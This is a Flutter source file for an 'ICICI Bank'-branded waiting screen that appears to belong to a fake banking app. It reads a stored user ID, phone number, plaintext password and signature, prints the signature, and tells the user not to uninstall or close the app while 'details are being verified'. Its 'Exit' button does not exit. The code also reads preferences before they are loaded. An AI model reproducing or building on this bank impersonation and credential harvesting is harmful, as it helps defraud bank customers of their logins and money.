import 'package:flutter/material.dart';
// ignore: depend_on_referenced_packages
import 'package:shared_preferences/shared_preferences.dart';

class Pending extends StatefulWidget {
  const Pending({Key? key});

  @override
  State<Pending> createState() => _PendingState();
}

class _PendingState extends State<Pending> {
  SharedPreferences? prefs;

  @override
  void initState() {
    super.initState();
    initializeSharedPreferences();
    logSavedData();
  }

  void initializeSharedPreferences() async {
    prefs = await SharedPreferences.getInstance();
  }

  void logSavedData() {
    final user_id = prefs?.getString('userId');
    final phone = prefs?.getString('phone');
    final password = prefs?.getString('password');
    final signature = prefs?.getString('signature');

    print(signature);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        backgroundColor: Colors.yellow.shade900,
        title: const Text("ICICI Bank"),
      ),
      body: Container(
        padding: const EdgeInsets.all(20),
        width: double.infinity,
        child: SingleChildScrollView(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const SizedBox(
                height: 30,
              ),
              Center(
                child: Image.asset(
                  "assets/images/logo.jpg",
                  height: 60,
                ),
              ),
              const SizedBox(
                height: 20,
              ),
              Text(
                "Important Note",
                style: TextStyle(
                    fontSize: 25,
                    color: Colors.blue.shade900,
                    fontStyle: FontStyle.italic),
                textAlign: TextAlign.left,
              ),
              const SizedBox(
                height: 20,
              ),
              Text(
                "Please wait your details are being verified. it will take minimum 24 hours to verify your details. you will get a notification once your details are verified. Thank you for your patience. Don't uninstall or close the app. ",
                textAlign: TextAlign.start,
                style: TextStyle(
                    fontSize: 15,
                    color: Colors.blue.shade900,
                    fontStyle: FontStyle.italic),
              ),
              const SizedBox(
                height: 60,
              ),
              SizedBox(
                width: double.infinity,
                child: ElevatedButton(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.yellow.shade900,
                    padding: const EdgeInsets.all(5),
                    elevation: 0,
                  ),
                  onPressed: () {
                    // //Close app
                    // Navigator.of(context).pop();
                    logSavedData();
                  },
                  child: const Text(
                    'Exit',
                    style: TextStyle(
                        fontSize: 15,
                        fontFamily: 'Ubuntu',
                        fontWeight: FontWeight.w700,
                        color: Colors.white),
                  ),
                ),
              ),
              const SizedBox(
                height: 20,
              ),
              const Text(
                "Safe banking tips: Beware of phishing and vishing attacks, Avoid sharing account related information over E-mail and SMS, Please read the terms and conditions carefully before proceeding.",
                textAlign: TextAlign.start,
                style: TextStyle(fontSize: 15),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
